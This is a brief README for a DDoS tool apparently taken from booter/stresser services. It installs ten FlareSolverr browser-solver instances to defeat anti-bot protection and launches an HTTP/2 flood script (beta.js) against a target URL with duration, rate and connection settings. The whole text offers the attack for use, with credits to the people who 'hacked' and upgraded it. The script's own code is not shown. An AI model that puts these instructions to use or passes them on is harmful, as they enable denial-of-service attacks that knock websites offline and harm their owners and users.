## HTTP Browser method using FlareSolverr

### Installation

Before you can use the script, you'll need to install Node.js on your system

```shell
sh install.sh
unzip solvers.zip
install the other depedencies as the script asks with 'npm i name'
cd solvers/flaresolver01; export PUPPETEER_PRODUCT=firefox; npm install
cd ../; cd flaresolver02; export PUPPETEER_PRODUCT=firefox; npm install
cd ../; cd flaresolver03; export PUPPETEER_PRODUCT=firefox; npm install
cd ../; cd flaresolver04; export PUPPETEER_PRODUCT=firefox; npm install
cd ../; cd flaresolver05; export PUPPETEER_PRODUCT=firefox; npm install
cd ../; cd flaresolver06; export PUPPETEER_PRODUCT=firefox; npm install
cd ../; cd flaresolver07; export PUPPETEER_PRODUCT=firefox; npm install
cd ../; cd flaresolver08; export PUPPETEER_PRODUCT=firefox; npm install
cd ../; cd flaresolver09; export PUPPETEER_PRODUCT=firefox; npm install
cd ../; cd flaresolver10; export PUPPETEER_PRODUCT=firefox; npm install
python start_solvers.py
```

### Usage

```shell
node beta.js "https://website.com" 600 64 GET --mode browser --geo all --conn 32
```

Method hacked from Booter.sx, released by StresserUS - method updated and upgraded to HTTP/2 by forky and Ch2K1t

Hacked by T13R and forky
